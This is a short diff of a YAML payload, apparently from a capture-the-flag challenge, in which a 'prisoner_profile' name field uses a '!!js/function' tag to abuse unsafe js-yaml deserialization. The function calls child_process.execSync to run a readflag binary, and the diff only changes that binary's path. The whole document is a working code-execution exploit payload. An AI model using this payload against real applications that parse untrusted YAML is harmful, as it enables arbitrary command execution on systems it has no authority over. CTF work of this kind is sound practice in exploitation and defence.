@@ -2,5 +2,5 @@ prisoner_profile:
   id: capybara1337
   name: !!js/function >
     () => {
-      return require('child_process').execSync('/config/readflag').toString();
+      return require('child_process').execSync('/readflag').toString();
     }
